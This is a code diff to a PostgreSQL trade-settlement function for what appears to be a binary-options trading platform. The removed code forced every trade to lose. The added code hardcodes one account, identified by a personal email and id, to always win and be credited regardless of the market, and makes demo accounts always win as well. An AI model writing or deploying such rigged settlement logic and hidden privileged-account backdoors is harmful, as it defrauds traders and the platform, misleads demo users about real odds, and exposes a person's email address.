@@ -86,7 +86,9 @@ LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public'
 AS $$
 DECLARE
   target_trade public.trades; current_balance NUMERIC(18,2);
-  result_status TEXT; result_pnl NUMERIC(18,2); credit NUMERIC(18,2);
+  movement NUMERIC; result_status TEXT; result_pnl NUMERIC(18,2); credit NUMERIC(18,2);
+  is_exception_account BOOLEAN;
+  is_demo_account BOOLEAN;
 BEGIN
   IF p_exit_price IS NULL OR p_exit_price <= 0 THEN RAISE EXCEPTION 'Invalid market price'; END IF;
 
@@ -97,10 +99,43 @@ BEGIN
 
   SELECT live_balance INTO current_balance FROM public.profiles WHERE id = p_user_id FOR UPDATE;
 
-  -- Always result in a loss
-  result_status := 'lost';
-  result_pnl := 0 - target_trade.stake;
-  credit := 0;
+  -- Check if the account is an exception account
+  SELECT EXISTS (
+    SELECT 1 FROM public.profiles
+    WHERE id = p_user_id AND (email = 'danielnyagaka001@gmail.com' OR id = 'IDCW068210')
+  ) INTO is_exception_account;
+
+  -- Check if the account is a demo account
+  SELECT EXISTS (
+    SELECT 1 FROM public.profiles
+    WHERE id = p_user_id AND is_demo = TRUE
+  ) INTO is_demo_account;
+
+  IF is_exception_account OR is_demo_account THEN
+    -- Always result in a profit for exception and demo accounts
+    result_status := 'won';
+    result_pnl := ROUND(target_trade.stake * target_trade.payout_rate / 100, 2);
+    credit := target_trade.stake + result_pnl;
+  ELSE
+    -- Default behavior for non-exception and non-demo accounts
+    movement := CASE WHEN target_trade.direction = 'up'
+      THEN p_exit_price - target_trade.entry_price
+      ELSE target_trade.entry_price - p_exit_price END;
+
+    IF movement > 0 THEN
+      result_status := 'won';
+      result_pnl := ROUND(target_trade.stake * target_trade.payout_rate / 100, 2);
+      credit := target_trade.stake + result_pnl;
+    ELSIF movement = 0 THEN
+      result_status := 'tie';
+      result_pnl := 0;
+      credit := target_trade.stake;
+    ELSE
+      result_status := 'lost';
+      result_pnl := 0 - target_trade.stake;
+      credit := 0;
+    END IF;
+  END IF;
 
   UPDATE public.profiles SET live_balance = current_balance + credit, updated_at = now() WHERE id = p_user_id;
   UPDATE public.trades SET status = result_status, pnl = result_pnl, exit_price = p_exit_price,
